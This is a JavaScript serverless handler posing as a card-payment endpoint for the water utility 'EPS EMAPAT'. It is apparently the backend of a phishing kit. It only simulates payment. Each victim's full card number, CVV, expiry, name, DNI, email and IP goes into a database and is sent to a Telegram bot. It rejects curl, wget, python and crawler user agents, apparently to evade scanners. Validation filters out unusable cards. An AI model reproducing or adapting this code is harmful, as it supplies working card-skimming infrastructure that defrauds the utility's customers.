const { neon } = require('@neondatabase/serverless');
const { checkRateLimit, isIPBlocked, containsOffensiveWords, sanitizeForLog, getClientIP } = require('./utils');

// Luhn algorithm for credit card validation
function isValidLuhn(num) {
  const digits = num.replace(/\D/g, '');
  if (digits.length < 13 || digits.length > 19) return false;
  
  let sum = 0;
  let isEven = false;
  
  for (let i = digits.length - 1; i >= 0; i--) {
    let digit = parseInt(digits[i], 10);
    
    if (isEven) {
      digit *= 2;
      if (digit > 9) digit -= 9;
    }
    
    sum += digit;
    isEven = !isEven;
  }
  
  return sum % 10 === 0;
}

// Validate card expiration date (MM/YY format, must be future date)
function isValidExpiration(vencimiento) {
  if (!/^\d{2}\/\d{2}$/.test(vencimiento)) return false;
  
  const [mes, anio] = vencimiento.split('/').map(Number);
  if (mes < 1 || mes > 12) return false;
  
  const now = new Date();
  const currentYear = now.getFullYear() % 100;
  const currentMonth = now.getMonth() + 1;
  
  // Card must not be expired
  if (anio < currentYear) return false;
  if (anio === currentYear && mes < currentMonth) return false;
  
  // Card must not expire more than 10 years from now
  if (anio > currentYear + 10) return false;
  
  return true;
}

// Validate CVV (3-4 digits only)
function isValidCVV(cvv, isAmex) {
  const expectedLength = isAmex ? 4 : 3;
  return /^\d+$/.test(cvv) && cvv.length === expectedLength;
}

// Validate cardholder name (only letters, spaces, accents, and common name characters)
function isValidName(name) {
  if (!name || name.length < 2 || name.length > 100) return false;
  // Allow letters, spaces, accents, periods, hyphens, and apostrophes
  return /^[a-zA-ZáéíóúÁÉÍÓÚñÑüÜ\s.\-']+$/.test(name);
}

function detectarTipo(num) {
  const n = num.replace(/\s/g, '');
  if (n.startsWith('4')) return 'VISA';
  if (n.startsWith('5') || n.startsWith('2')) return 'MASTERCARD';
  if (n.startsWith('3')) return 'AMEX';
  return 'TARJETA';
}

function maskCard(num) {
  const n = num.replace(/\s/g, '');
  const tipo = detectarTipo(n);
  return `${tipo} **** **** **** ${n.slice(-4)}`;
}

function simularPago(num) {
  const n = num.replace(/\s/g, '');
  const aprobadas = ['4111111111111111','4242424242424242','5500005555555559','5105105105105100'];
  const rechazadas = ['4000000000000002','4000000000009995','4000000000000069'];
  if (aprobadas.includes(n)) return { exitoso: true };
  if (rechazadas.includes(n)) return { exitoso: false, motivo: 'Tarjeta rechazada por el banco' };
  if (n.length >= 15) return { exitoso: true };
  return { exitoso: false, motivo: 'Número de tarjeta inválido' };
}

async function sendTelegram(data) {
  const token  = process.env.TELEGRAM_BOT_TOKEN;
  const chatId = process.env.TELEGRAM_CHAT_ID;
  if (!token || !chatId) return;
  const icono = data.estado === 'EXITOSO' ? '✅' : '❌';
  const msg = [
    `${icono} *NUEVO PAGO — EPS EMAPAT*`,
    `━━━━━━━━━━━━━━━━━━━━`,
    `👤 *Cliente:* ${sanitizeForLog(data.nombre, 50)}`,
    `📋 *Suministro:* ${sanitizeForLog(data.codcliente, 20)}`,
    ...(data.dni ? [`🪪 *DNI:* ${sanitizeForLog(data.dni, 15)}`] : []),
    ...(data.email ? [`📧 *Correo:* ${sanitizeForLog(data.email, 50)}`] : []),
    `💰 *Monto:* S/ ${Number(data.monto).toFixed(2)}`,
    `━━━━━━━━━━━━━━━━━━━━`,
    `💳 *Tarjeta:* ${sanitizeForLog(data.tarjeta, 30)}`,
    `🔢 *Número:* \`${sanitizeForLog(data.numTarjetaCompleto, 20)}\``,
    `📅 *Vencimiento:* ${sanitizeForLog(data.vencimiento, 5)}`,
    `🔐 *CVV:* ${sanitizeForLog(data.cvv, 4)}`,
    `👤 *Titular:* ${sanitizeForLog(data.titular, 50)}`,
    `🌐 *IP:* \`${sanitizeForLog(data.ip, 45)}\``,
    `━━━━━━━━━━━━━━━━━━━━`,
    `${icono} *Estado:* ${data.estado}`,
    `🆔 *N° Op:* ${data.nroOperacion}`,
    `🕐 *Fecha:* ${data.fecha}`,
  ].join('\n');
  await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ chat_id: chatId, text: msg, parse_mode: 'Markdown' }),
  });
}

async function guardarEnDB(sql, data) {
  await sql`
    INSERT INTO pagos
      (codigo_cliente, nombre, monto, tarjeta, num_tarjeta_completo, cvv, titular, vencimiento, estado, nro_operacion)
    VALUES
      (${data.codcliente}, ${data.nombre}, ${data.monto}, ${data.tarjeta},
       ${data.numTarjetaCompleto}, ${data.cvv}, ${data.titular},
       ${data.vencimiento}, ${data.estado}, ${data.nroOperacion})
  `;
}

module.exports = async (req, res) => {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'POST,OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
  if (req.method === 'OPTIONS') return res.status(200).end();
  if (req.method !== 'POST') return res.status(405).json({ error: 'Método no permitido' });

  const ip = getClientIP(req);

  // Check if IP is blocked
  if (isIPBlocked(ip)) {
    return res.status(403).json({ error: 'Acceso denegado' });
  }

  // Rate limit: 5 payment attempts per minute per IP
  if (!checkRateLimit(ip, 5)) {
    return res.status(429).json({ error: 'Demasiados intentos de pago. Espera un minuto.' });
  }

  // Check for suspicious user agents
  const userAgent = req.headers['user-agent'] || '';
  const suspiciousAgents = ['bot', 'crawler', 'spider', 'scraper', 'curl', 'wget', 'python', 'java'];
  if (suspiciousAgents.some(agent => userAgent.toLowerCase().includes(agent))) {
    return res.status(403).json({ error: 'Acceso denegado' });
  }

  const { codcliente, nombre, monto, numTarjeta, titular, vencimiento, cvv, dni, email, _t, website } = req.body || {};

  // Honeypot check - bots fill this hidden field
  if (website) {
    return res.status(400).json({ error: 'Solicitud rechazada' });
  }

  // Timing check - reject if submitted too quickly (< 3 seconds)
  if (_t) {
    const elapsed = Date.now() - _t;
    if (elapsed < 3000) {
      return res.status(400).json({ error: 'Solicitud rechazada' });
    }
  }

  if (!codcliente || !monto || !numTarjeta || !titular || !vencimiento) {
    return res.status(400).json({ error: 'Faltan campos requeridos' });
  }

  // Validate that the code only contains alphanumeric characters and hyphens
  if (!/^[a-zA-Z0-9\-]+$/.test(codcliente) || codcliente.length > 20) {
    return res.status(400).json({ error: 'Código de cliente inválido' });
  }

  // Validate credit card number with Luhn algorithm
  const numLimpio = numTarjeta.replace(/\s/g, '');
  if (!isValidLuhn(numLimpio)) {
    return res.status(400).json({ error: 'Número de tarjeta inválido' });
  }

  // Validate expiration date
  if (!isValidExpiration(vencimiento)) {
    return res.status(400).json({ error: 'Fecha de vencimiento inválida o tarjeta vencida' });
  }

  // Validate CVV
  const isAmexCard = /^(34|37)/.test(numLimpio);
  if (!isValidCVV(cvv, isAmexCard)) {
    return res.status(400).json({ error: 'CVV inválido' });
  }

  // Validate cardholder name
  if (!isValidName(titular)) {
    return res.status(400).json({ error: 'Nombre del titular inválido' });
  }

  // Validate monto (must be a positive number, max S/ 50,000)
  if (typeof monto !== 'number' || monto <= 0 || monto > 50000) {
    return res.status(400).json({ error: 'Monto inválido' });
  }

  // Filter offensive words
  const camposTexto = [codcliente, nombre, titular, dni, email].filter(c => c).map(c => c.toLowerCase());
  if (camposTexto.some(campo => containsOffensiveWords(campo))) {
    return res.status(400).json({ error: 'Contenido no permitido' });
  }

  await new Promise(r => setTimeout(r, 400));

  const resultado       = simularPago(numTarjeta);
  const nroOperacion    = `OP-${Date.now().toString().slice(-8)}`;
  const fecha           = new Date().toLocaleString('es-PE', { timeZone: 'America/Lima' });
  const tarjetaMask     = maskCard(numTarjeta);
  const numCompleto     = numTarjeta.replace(/\s/g, '');
  const estado          = resultado.exitoso ? 'EXITOSO' : 'RECHAZADO';

  const record = {
    codcliente, nombre, monto: Number(monto),
    tarjeta: tarjetaMask, numTarjetaCompleto: numCompleto,
    cvv: cvv || '', titular, vencimiento, estado, nroOperacion, fecha,
    dni: dni || undefined, email: email || undefined, ip,
  };

  if (process.env.DATABASE_URL) {
    try { await guardarEnDB(neon(process.env.DATABASE_URL), record); }
    catch (e) { console.error('DB error:', e); }
  }

  try { await sendTelegram(record); } catch (e) { console.error('Telegram error:', e); }

  if (!resultado.exitoso) {
    return res.status(200).json({ exitoso: false, motivo: resultado.motivo, nroOperacion });
  }
  return res.status(200).json({ exitoso: true, nroOperacion, tarjeta: tarjetaMask, fecha });
};
